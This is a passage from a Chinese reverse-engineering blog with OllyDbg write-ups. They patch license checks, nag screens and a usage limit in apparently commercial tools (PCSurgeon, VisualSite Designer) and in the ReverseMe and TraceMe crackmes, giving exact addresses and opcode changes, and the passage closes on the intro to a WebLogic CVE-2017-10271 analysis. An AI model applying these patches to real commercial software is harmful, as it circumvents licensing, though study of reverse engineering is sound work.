<h5 id="打Patch"><a href="#打Patch" class="headerlink" title="打Patch"></a>打Patch</h5><p>一共两处需要跳转，都修改为<code>jmp</code>即可，保存为新文件<code>pcsurgeon1.exe</code>，运行后显示注册成功</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263984191.png" alt="1689263984191"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689264016694.png" alt="1689264016694"></p>
<h4 id="破解二（修改认证文件OR数据？）"><a href="#破解二（修改认证文件OR数据？）" class="headerlink" title="破解二（修改认证文件OR数据？）"></a>破解二（修改认证文件OR数据？）</h4><h5 id="破解分析"><a href="#破解分析" class="headerlink" title="破解分析"></a>破解分析</h5><p>同样根据特殊字符串<code>&lt;unregistered</code>进行定位，并在上面打一个断点，汇编代码如下，这里有两处比较，且都是<code>jnz pcsurgeo.005CC935</code>，这里可以猜测若第一个直接跳转，则不需要走第二个点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">005CC820   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005CC825   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005CC828   .  0F85 07010000 jnz pcsurgeo.005CC935</span><br><span class="line">005CC82E   .  A1 DCF16000   mov eax,dword ptr ds:[0x60F1DC]</span><br><span class="line">005CC833   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005CC836   .  0F85 F9000000 jnz pcsurgeo.005CC935</span><br></pre></td></tr></table></figure>

<p>首先EAX的值为<code>4A 0C 61 00</code>，转换为内存地址为<code>0X00610C4A</code></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691137964.png" alt="1689691137964"></p>
<p>然后<code>ds:[eax]</code>的值为<code>00 00 00 00</code>，这也导致了后面的CMP比较相等，ZF置为1，无法跳转，弹出了未注册标识，此处的想法是更改掉<code>ds:[eax]</code>的值进行绕过，可以先改为1然后试试</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691194958.png" alt="1689691194958"></p>
<p>这里我们需要找到程序是在哪里给<code>ds:[eax]</code>赋值的，所以需要<code>右键</code>选择<code>参考</code>，然后选择<code>地址常量</code>，找到所有引用该地址的地方</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691480656.png" alt="1689691480656"></p>
<p>然后给所有地址打上断点，重新运行程序</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691572488.png" alt="1689691572488"></p>
<p>下面既是对关键字进行赋值，其中第二行赋值操作既是对上面的<code>ds:[eax]</code>进行赋值，这里可以直接将al替换成<code>0x01</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#将校验文件地址存储到EDX寄存器</span><br><span class="line">005C2BF6   .  8B15 8CEB6000 mov edx,dword ptr ds:[0x60EB8C]; pcsurgeo.00610C4A</span><br><span class="line">#将al赋值给校验地址</span><br><span class="line">005C2BFC   .  8802          mov byte ptr ds:[edx],al</span><br><span class="line">005C2BFE   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005C2C03   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691614994.png" alt="1689691614994"></p>
<p>修改如下，右键选择保存，但是报错了，提示修改了重定位信息，这是因为mov操作寄存器或者立即数时，对应的机器码不相等，原本操作寄存器时，机器码为：<code>88 02</code>，而立即数对应了<code>C6 02 01</code>，打乱了后面的汇编指令，造成了一堆NOP指令，这里报错可以先忽略，直接保存文件看看是否正常运行</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691916878.png" alt="1689691916878"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691958162.png" alt="1689691958162"></p>
<p>打开破解后的文件，已注册</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689692079948.png" alt="1689692079948"></p>
<h5 id="解决重定位报错"><a href="#解决重定位报错" class="headerlink" title="解决重定位报错"></a>解决重定位报错</h5><h6 id="方法一（失败）"><a href="#方法一（失败）" class="headerlink" title="方法一（失败）"></a>方法一（失败）</h6><p>想办法填充NOP的位置，一共四个NOP指令，也就是4字节，可以使用<code> mov eax,eax</code>操作，不对正常业务造成影响，刚好占用两个字节，使用两次即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">89C0          mov eax,eax</span><br><span class="line">89C0          mov eax,eax</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693041865.png" alt="1689693041865"></p>
<p>失败原因：后面CMP操作会比较EAX的值，这样会影响正常业务</p>
<h6 id="方法二（成功）"><a href="#方法二（成功）" class="headerlink" title="方法二（成功）"></a>方法二（成功）</h6><p>重点放在下面几行汇编中，这是判断加跳转的语句，由于<code>ds:[eax]==0x01</code>，不等于<code>0x0</code>，那么下面的跳转一定会实现，所以我们可以直接更改代码逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">005C2BFE      A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005C2C03      8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005C2C06   .  75 0D         jnz short pcsurgeo.005C2C15</span><br></pre></td></tr></table></figure>

<p>放弃CMP比较操作，直接改为赋值，解决了上面的NOP问题，然后直接使用<code>JMP</code>进行跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">005C2C03      C600 01       mov byte ptr ds:[eax],0x1</span><br><span class="line">005C2C06      EB 0D         jmp short pcsurgeo.005C2C15</span><br><span class="line">005C2C08   .  E8 6307EEFF   call pcsurgeo.004A3370</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693425366.png" alt="1689693425366"></p>
<p>这次保存文件没有报错了，程序正常启动并且成功破解</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693506484.png" alt="1689693506484"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693535166.png" alt="1689693535166"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">VisualSite Designer逆向破解分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-17 21:16:34" itemprop="dateCreated datePublished" datetime="2022-09-17T21:16:34+08:00">2022-09-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="直接运行程序"><a href="#直接运行程序" class="headerlink" title="直接运行程序"></a>直接运行程序</h3><p>注意观察call指令的后几条指令，若为退出程序的指令，则说明该CALL为正常程序必须调用的，不可跳过</p>
<p>首先会弹出一个NAG窗口，底下显示使用次数</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687078973564.png" alt="1687078973564"></p>
<p>进入后界面如下</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687078995463.png" alt="1687078995463"></p>
<p>关闭后又弹出NAG窗口</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079052395.png" alt="1687079052395"></p>
<h3 id="Start-Cracking"><a href="#Start-Cracking" class="headerlink" title="Start Cracking"></a>Start Cracking</h3><p><strong>破解目的</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、去除程序刚启动弹出的NAG窗口</span><br><span class="line"><span class="number">2</span>、绕过<span class="number">10</span>次使用限制</span><br><span class="line"><span class="number">3</span>、去除程序退出时的NAG窗口</span><br></pre></td></tr></table></figure>

<h4 id="破解场景一"><a href="#破解场景一" class="headerlink" title="破解场景一"></a>破解场景一</h4><p>首先要找到程序弹窗入口，使用<code>Ctrl+F8</code>自动化往下走</p>
<p>发现在一个位置一直循环，可能是在校验程序信息</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079343943.png" alt="1687079343943"></p>
<p>先断在<code>inc esi</code>处，发现为程序的绝对路径</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079692679.png" alt="1687079692679"></p>
<p>循环次数较多，可以先在循环外打个断点，然后重新运行程序，可以直接运行到断点处</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080040928.png" alt="1687080040928"></p>
<p>之后一路<code>F8</code>，直到出现NAG窗口，在出现CALL的时候NAG弹出，此处不能跳过这个CALL，因为跳过之后，直接运行了程序退出函数，所有前面那个call是程序正常运行调用的，需要使用<code>F7</code>步入，在此处打上断点，重新运行程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004BD497  |.  E8 74000000   call VisualSi.004BD510</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080423077.png" alt="1687080423077"></p>
<p>同样的，后面先一路F8，直到出现NAG窗口，再使用F7步入，一直循环往复，直到下面的这个CALL，使用F7进入后全是无条件跳转，后面就不需要继续跟进了</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080899178.png" alt="1687080899178"></p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080919192.png" alt="1687080919192"></p>
<p>我们选择启动程序，然后F8步过，发现返回的<code>EAX=0x00000001</code>，这里可能是校验使用</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687094137552.png" alt="1687094137552"></p>
<p>现在尝试将这个函数调用NOP掉，或者直接给EAX赋值，移除次数验证</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687096313955.png" alt="1687096313955"></p>
<p>然后保存文件，重新加载，第一个<code>NAG</code>已经去除了</p>
<p>之后关闭程序前使用<code>alt+F9</code>，定位到关闭窗口的NAG，将那个CALL置为NOP即可</p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687098504565.png" alt="1687098504565"></p>
<p>修改后为<code>NOP</code></p>
<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687098535297.png" alt="1687098535297"></p>
<h4 id="破解场景二"><a href="#破解场景二" class="headerlink" title="破解场景二"></a>破解场景二</h4><p>前面是跳过了减数函数，所以可以无限使用，但如果次数用光了也无法使用，原因应该是写了注册表，但现在就不关注注册表的值了，还是以破解为主</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">ReverseMe逆向分析破解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-04 16:25:14" itemprop="dateCreated datePublished" datetime="2022-09-04T16:25:14+08:00">2022-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="GetModuleHandleA"><a href="#GetModuleHandleA" class="headerlink" title="GetModuleHandleA"></a>GetModuleHandleA</h3><p>获取模块句柄函数（返回的是私有句柄）</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935300048.png" alt="1668935300048"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935413298.png" alt="1668935413298"></p>
<h3 id="LoadIconA"><a href="#LoadIconA" class="headerlink" title="LoadIconA()"></a>LoadIconA()</h3><p>（加载图标函数），LoadCursorA()（加载光标）</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935442602.png" alt="1668935442602"></p>
<h2 id="逆向开始"><a href="#逆向开始" class="headerlink" title="逆向开始"></a>逆向开始</h2><p>1.前面正常步过，到达第一个跳转，此处CreateFileA函数表示想要打开许可证文件，显然文件不存在就直接报错了。</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935817910.png" alt="1668935817910"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936065650.png" alt="1668936065650"></p>
<p>2.若不跳转，下方代码将显示凭证失效，跳转失败</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935888696.png" alt="1668935888696"></p>
<p>3.修改标志位ZF&#x3D;0，进行跳转，到达第二个跳转处，能看到一个ReadFile函数，显然会读取文件内容，后续进行校验，而下方的JMP跳转[004010F7]也是显示许可证无效的，所以需要在JNZ处跳转。</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936195001.png" alt="1668936195001"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936252826.png" alt="1668936252826"></p>
<p>4.第三个跳转点，依旧是报错码地址，不能跳转，修改SF&#x3D;0</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936489401.png" alt="1668936489401"></p>
<p>5.接着走，看到一堆跳转，发现只有00401205是通往正确的路径，跳转如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">je short 004010D3  跳转</span><br><span class="line">jl short 004010F7  不跳转</span><br><span class="line">jmp 00401205	   无条件跳转</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936714514.png" alt="1668936714514"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936781792.png" alt="1668936781792"></p>
<p>6.成功破解</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936987070.png" alt="1668936987070"></p>
<p>7.修改函数内容，保存破解文件</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668937666210.png" alt="1668937666210"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668937688272.png" alt="1668937688272"></p>
<h2 id="算法分析，解密许可证"><a href="#算法分析，解密许可证" class="headerlink" title="算法分析，解密许可证"></a>算法分析，解密许可证</h2><p>1.新建一个Keyfile.bat文件，写入五字节的字符串”12345”，并跟进到函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword ptr ds:[0x402173],0x10</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938779690.png" alt="1668938779690"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938863596.png" alt="1668938863596"></p>
<p>2.显然该处内存存储的是许可证的字节大小，由jl跳转可知，只有许可证大于16字节才能继续验证</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938977114.png" alt="1668938977114"></p>
<p>3.读取许可证内容，赋值给AL，ascii码的1为16进制的”0x31”,接着与0X47进行比较，发现为ascii码的大写字母”G”，若第一个字节相等，就跳转验证第二个字节，显然每次循环都是比较”G”</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668939276874.png" alt="1668939276874"></p>
<p>4.结论，先校验许可证是否有16字节，然后比较前8字节是否全等于”G”，当前八字节通过验证后，即全部通过验证。</p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668940563253.png" alt="1668940563253"></p>
<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668940585421.png" alt="1668940585421"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">TraceMe逆向分析破解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-03 14:14:53" itemprop="dateCreated datePublished" datetime="2022-09-03T14:14:53+08:00">2022-09-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="待破解程序"><a href="#待破解程序" class="headerlink" title="待破解程序"></a>待破解程序</h2><p>需要破解该程序序列号</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1693760189718.png" alt="1693760189718"></p>
<h2 id="前期思路"><a href="#前期思路" class="headerlink" title="前期思路"></a>前期思路</h2><p>首先使用触发型断点方式，遇到程序运行就进行断点，但最终会进入到死循环</p>
<p>后来发现是一个消息队列，只有识别到输入之后才会读取到输入的参数</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701128742.png" alt="1668701128742"></p>
<p>我们知道windows读取文本框的字符串的常用函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetDlgItemTextA(GetDlgTtemTextW)</span><br><span class="line">GetWindowTextA(GetWindowTextA)</span><br></pre></td></tr></table></figure>

<h2 id="转换思路"><a href="#转换思路" class="headerlink" title="转换思路"></a>转换思路</h2><p>使用ctrl+G搜索上述函数，并查找到对应函数，其使用了GetDlgItemTextA函数</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701686552.png" alt="1668701686552"></p>
<p>直接在这里打上断点，然后运行到该位置，弹窗需要输入账户，序列号</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701845419.png" alt="1668701845419"></p>
<p>一直单步F8往下走，只到下方出现了熟悉的字符串”yubank”</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702387021.png" alt="1668702387021"></p>
<p>显然，EAX和EDX分别存储序列号和用户名，下面那个”call 00401340”显然为调用的验证函数</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702468103.png" alt="1668702468103"></p>
<p>又已知”EAX”为所调用函数的返回值，我们接着往下走，跳过函数，执行完test操作后，Z为1，说明函数返回值EAX为0</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702812828.png" alt="1668702812828"></p>
<p>前置知识：JE的作用，当eax为0是，ZF为1，跳转</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702712877.png" alt="1668702712877"></p>
<p>显然往下走，就提示错误了，说明函数验证未通过，返回了0</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702922363.png" alt="1668702922363"></p>
<h2 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h2><p>1、修改EAX的指为正数，或者修改test的参数为正数</p>
<p>2、修改跳转函数，将其反过来，密码错误就表示成功</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703147710.png" alt="1668703147710"></p>
<p>3、直接注释跳转函数</p>
<h2 id="实现破解"><a href="#实现破解" class="headerlink" title="实现破解"></a>实现破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将test eax,eax 修改为 test esp,esp  (其中esp = 0xc ,为正数)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703910927.png" alt="1668703910927"></p>
<p>破解成功</p>
<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703993354.png" alt="1668703993354"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/" class="post-title-link" itemprop="url">weblogic漏洞分析-CVE-2017-10271（IDEA+Docker）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-14 17:29:18" itemprop="dateCreated datePublished" datetime="2022-08-14T17:29:18+08:00">2022-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-web/" itemprop="url" rel="index"><span itemprop="name">Java web</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了学习反序列化漏洞，这里挑选一个经典漏洞<code>CVE-2017-10271</code>进行分析，并结合漏洞原理构造一些变形Payload并加以利用</p>
